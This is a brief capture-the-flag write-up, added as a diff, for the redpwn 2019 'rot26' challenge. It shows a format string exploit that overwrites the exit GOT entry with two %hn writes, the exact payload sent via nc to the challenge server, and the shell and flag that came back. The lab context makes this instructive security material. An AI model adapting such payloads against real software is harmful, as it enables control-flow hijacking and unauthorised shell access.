@@ -1,0 +1,51 @@
+rot26 doesn't do any transforming to the buffer, so we get a free pass on
+a classic format string exploit
+
+objdump -D rot26 | grep winners_room
+08048737 <winners_room>:
+
+x/wx 0x80484a0
+0x80484a0 <exit@plt>:	jmp    DWORD PTR ds:0x804a020
+
+perform two half-writes
+>>> 0x8737 write at 0x804a020
+34615
+because of 2052 + formats, need to write 32563
+>>> 0x0804 write at 0x804a022
+2052
+
+echo -ne "%2052u%11\$pp%34615u%12\$ppAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"
+
+gef➤  x/32wx $esp
+0xffffb2c0:	0xffffc2dc	0xffffb2dc	0x00001000	0x08048791
+0xffffb2d0:	0x00000000	0x00000000	0x00000000	0x35303225
+0xffffb2e0:	0x31257532	0x70702431	0x36343325	0x25753531
+0xffffb2f0:	0x70243231	0x41414170	0x42424241	0x43434342
+0xffffb300:	0x44444443	0x45454544	0x46464645	0x47474746
+0xffffb310:	0x48484847	0x49494948	0x00000049	0x00000000
+0xffffb320:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffb330:	0x00000000	0x00000000	0x00000000	0x00000000
+
+42949475480x25753531p
+40960x70243231pAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
+
+echo -ne "%2052u%14\$hn%32563u%15\$hnAAA\x22\xa0\x04\x08\x20\xa0\x04\x08CDDDDEEEEFFFFGGGGHHHHIIII"
+
+(echo -ne "%2052u%14\$hn%32563u%15\$hnAAA\x22\xa0\x04\x08\x20\xa0\x04\x08CDDDDEEEEFFFFGGGGHHHHIIII" ; cat) | nc chall.2019.redpwn.net 4003
+
+Please, take a shell!
+id
+/bin/sh: 1: id: not found
+ls
+Makefile
+bin
+dev
+flag.txt
+lib
+lib32
+lib64
+rot26
+rot26.c
+cat flag.txt
+flag{w4it_d03s_r0t26_4ctu4lly_ch4ng3_4nyth1ng?}
+
